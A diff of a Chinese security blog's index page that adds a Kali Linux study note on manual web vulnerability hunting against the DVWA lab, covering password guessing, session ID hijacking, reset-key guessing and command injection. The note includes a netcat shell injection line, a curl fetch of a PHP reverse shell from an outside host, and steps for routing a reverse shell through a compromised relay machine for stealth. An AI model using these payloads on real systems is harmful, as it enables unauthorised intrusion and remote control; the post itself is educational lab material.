@@ -240,6 +240,278 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81SessionID%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81SessionID%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" itemprop="url">Kali Linux笔记(四十五)：手动漏洞挖掘--身份认证、SessionID、密码找回、命令执行</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
+                2020-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  933 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-手动漏洞挖掘–身份认证"><a href="#1-手动漏洞挖掘–身份认证" class="headerlink" title="1. 手动漏洞挖掘–身份认证"></a>1. 手动漏洞挖掘–身份认证</h4><ul>
+<li>常用弱口令/基于字典的密码爆破</li>
+<li>锁定账号（密码锁定机制，尝试密码次数过多）</li>
+<li>信息收集<ul>
+<li>手机号（大部分手机号/邮箱号）</li>
+<li>页面返回errorcode（界面不显示errorcode）</li>
+<li>密码错误提示信息（猜测四位手机号，185xxxx4465）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐密码错误提示信息
+1.登录失败（安全性较高）
+2.用户名不存在
+3.密码错误</code></pre></blockquote>
+<ul>
+<li>密码嗅探</li>
+</ul>
+<h4 id="2-手动漏洞挖掘–会话sessionID"><a href="#2-手动漏洞挖掘–会话sessionID" class="headerlink" title="2. 手动漏洞挖掘–会话sessionID"></a>2. 手动漏洞挖掘–会话sessionID</h4><ul>
+<li>XSS/Cookie importer</li>
+<li>SessionID in URL（SessionID可以存在机器本地，也可存放在内存）</li>
+<li>嗅探</li>
+<li>SessionID长期不变/永久不变</li>
+</ul>
+<blockquote>
+<pre><code>▲ SessionID注入浏览器：
+1.获取其他机子的SessionID
+2.通过Cookie Manager过滤，编辑SessionID
+3.1.登出进行测试，后退是否能返回（SessionID可能不是活动状态，但可能永久不变）
+3.2.关闭浏览器，重新访问，替换SessionID，可能可以进行访问，SessionID固定不变</code></pre></blockquote>
+<ul>
+<li>SessionID生成算法<ul>
+<li>Sequencer</li>
+<li>私有算法</li>
+<li>预判下一次登陆时生成的SessionID（可能根据时间进行哈希计算作为SessionID）</li>
+<li>登出后返回测试</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-手动漏洞挖掘–密码找回"><a href="#3-手动漏洞挖掘–密码找回" class="headerlink" title="3. 手动漏洞挖掘–密码找回"></a>3. 手动漏洞挖掘–密码找回</h4><ul>
+<li><a href="https://www.example.com/reset?email=user@example.com&amp;key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514" target="_blank" rel="noopener">https://www.example.com/reset?email=user@example.com&amp;key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514</a></li>
+</ul>
+<blockquote>
+<pre><code>密码找回步骤：
+1.界面点击忘记密码按钮
+2.根据提示输入原密码邮箱等信息，点击发送邮件按钮
+3.服务器发送邮件到客户端邮箱
+4.打开邮件，邮件里面的链接可以进行密码重设（key值）
+▲ 链接的key值字符串，可能为邮箱账号进行md5运算(128位)或是sha-1(160位)或是sha-2(256位)</code></pre></blockquote>
+<h4 id="4-手动漏洞挖掘–命令执行"><a href="#4-手动漏洞挖掘–命令执行" class="headerlink" title="4. 手动漏洞挖掘–命令执行"></a>4. 手动漏洞挖掘–命令执行</h4><ul>
+<li>漏洞挖掘原则<ul>
+<li>所有变量（攻击注入手段）</li>
+<li>所有头（Cookie中的变量）</li>
+<li>逐个变量删除（Cookie还是body中的字段让服务器进行判断）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>DVWA命令执行漏洞/exec:header和body进行删除，需要对一些符号进行URL encode</code></pre></blockquote>
+<ul>
+<li>漏洞的本质<ul>
+<li>数据与指令的混淆</li>
+<li>对用户输入信息过滤不严判断失误，误将指令当数据</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐low：DVWA命令执行漏洞/exec
+1.如果是操作系统命令操作，而不是Web Application进行操作，可以进行命令行尝试
+2.查看Command Execution Source，发现没有对&apos;&amp;&amp;&apos;和&apos;;&apos;进行过滤
+⭐medium：DVWA命令执行漏洞/exec
+1.查看Command Execution Source，发现没有对&apos;&amp;&amp;&apos;和&apos;;&apos;进行过滤
+2.操作系统shell命令的熟悉程度，没有对&apos;&amp;&apos;和&apos;|&apos;进行过滤
+⭐high：DVWA命令执行漏洞/exec
+1.查看Command Execution Source，发现过滤很严格，先对字符串进行处理ip地址，然后对输入的内容进行&apos;.&apos;分割的成4段，然后再判断这4段是不是都是数字，如果是，则进行运行命令</code></pre></blockquote>
+<ul>
+<li>命令执行<ul>
+<li>应用程序开发者直接调用操作系统功能</li>
+<li>; &amp;&amp; | || &amp;</li>
+<li>查看源代码，过滤用户输入</li>
+<li>;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe</li>
+</ul>
+</li>
+<li>;curl <a href="http://1.1.1.1/php-revers-shell.php" target="_blank" rel="noopener">http://1.1.1.1/php-revers-shell.php</a></li>
+</ul>
+<blockquote>
+<pre><code>⭐curl下载执行php，反弹shell
+Kali
+1.cp /usr/share/webshells/php/php-reverse-shell.php /var/www/htmp/1.php
+2.启动apache2，services apache2 start
+3.编辑php-revers-shell.php的反弹IP地址 → Kali地址
+DVWA：
+1.;curl http://Kali IP地址/1.php
+▲ 结果返回的是Kali的shell，因为1.php在Kali上，所以只能返回Kali本机的shel
+
+⭐curl应用（控制肉鸡隐蔽性）
+1.三台机器，一台Kali，开启1234端口；一台服务器DVWA；一台肉鸡，有反弹shell的php
+2.kali发送;curl命令给DVWA，DVWA进行curl
+3.肉鸡上的反弹php返回一个shell给kali</code></pre></blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2919,224 +3191,6 @@ Firefox的默认UserAgent：Default User Agent → Default User Agent（每个�
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%85%AD)%EF%BC%9AWeb%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E5%8F%8A%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E5%85%AD)%EF%BC%9AWeb%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E5%8F%8A%E5%B7%A5%E5%85%B7/" itemprop="url">Kali Linux笔记(三十六)：Web渗透实验环境及工具</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:15+08:00">
-                2019-12-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  267 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1. 实验环境"></a>1. 实验环境</h4><ul>
-<li>Metasploitable（访问浏览器Metasploitable的网页）<ul>
-<li>Dvwa（不同级别Low → Medium → High）</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-侦察"><a href="#2-侦察" class="headerlink" title="2. 侦察"></a>2. 侦察</h4><ul>
-<li>Httrack<ul>
-<li>对目标网站的克隆复制</li>
-<li>减少与目标系统交互</li>
-</ul>
-</li>
-<li>Httrack<ul>
-<li>Enter Project name</li>
-<li>Base path（要ms拷贝的目录，大目录）</li>
-<li>Enter URLs（起始路劲）</li>
-<li>Action（一般选Mirror Web Site with Wizard）</li>
-<li>Proxy</li>
-<li>wildcard（定义通配符）</li>
-<li>Additional options（其余选项） </li>
-<li>Ready to launch the mirror</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>可选择的Action：
-Mirror Web Site：镜像网页站点
-Mirror Web Site with Wizard：网页向导
-Just Get file Indicated：获得某种类型的文件
-Mirror ALL links in URLs（Multiple Mirror）：镜像所有连接
-Test Links In URLs（Bookmark Test）：只测试连接
-▲ 代理可以通过 Hide My Ass来进行掩藏（可能需要代理Proxy List）</code></pre></blockquote>
-<h4 id="3-扫描工具"><a href="#3-扫描工具" class="headerlink" title="3. 扫描工具"></a>3. 扫描工具</h4><ul>
-<li>Nikto（纯主动扫描工具）</li>
-<li>Vega</li>
-<li>Skipfish</li>
-<li>W3af</li>
-<li>Arachni</li>
-<li>Owasp-zap</li>
-</ul>
-<blockquote>
-<pre><code>Web扫描工具模式
-1.代理截断模式：代理扫描截断
-2.主动扫描模式：主动扫描，注入代码
-▲ 自动扫描相对于手动扫描，更容易找到隐藏的页面，能提高很大的效率，但容易触发警报</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3191,7 +3245,7 @@ Test Links In URLs（Bookmark Test）：只测试连接
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">123</span>
+                  <span class="site-state-item-count">124</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3202,7 +3256,7 @@ Test Links In URLs（Bookmark Test）：只测试连接
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -3213,7 +3267,7 @@ Test Links In URLs（Bookmark Test）：只测试连接
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -3298,7 +3352,7 @@ Test Links In URLs（Bookmark Test）：只测试连接
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">109.7k</span>
+    <span title="Site words total count">111.3k</span>
   
 </div>
 
